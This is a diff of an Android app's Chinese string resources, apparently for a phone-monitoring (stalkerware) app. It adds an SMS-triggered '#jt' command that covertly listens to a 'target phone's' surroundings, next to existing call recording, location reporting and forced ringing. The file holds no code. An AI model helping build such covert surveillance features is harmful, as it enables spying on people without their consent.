@@ -53,6 +53,10 @@
     <string name="location_sms_base_station_cdma">点击链接查看手机基站定位：http://maps.google.com/?q=%s</string>
     <string name="location_sms_fail">抱歉，当前无法获得所在位置，请稍后再试。若一直无法解决请联系客服。</string>
     
+    <!-- Environment Listening -->
+    <string name="env_fail_offhook">目标手机正通话中，现在无法进行环境监听。</string>
+    <string name="env_fail_screen_on">对方正在操作目标手机，现在无法进行环境监听。</string>
+    
     <!-- Preferences -->
     <string name="pref_title">设定</string>
     <string name="pref_category_sender_mail_key">pref_category_sender</string>
@@ -67,6 +71,7 @@
     <string name="pref_category_gps_key">pref_category_gps</string>
     <string name="pref_category_gps_title">获取所在地理位置</string>
     <string name="pref_category_ring_title">响铃</string>
+    <string name="pref_category_env_title">环境监听</string>
     
     <string name="pref_sender_mail_title">发信邮箱（仅GMail或QQ）</string>
     <string name="pref_sender_mail_summary">仅支持Gmail和QQ邮箱。</string>
@@ -101,6 +106,8 @@
     <string name="pref_record_all_time_limit_in_trial">试用期间仅允许10次通话录音。</string>
     <string name="pref_ring_word_title">强制响铃</string>
     <string name="pref_ring_word_summary">发送短信#xl可强制使其响铃。</string>
+    <string name="pref_env_word_title">环境监听</string>
+    <string name="pref_env_word_summary">发送短信#jt可监听目标手机环境。</string>
     
     <!-- InitActivity -->
     <string name="init_title">安卓监控</string>
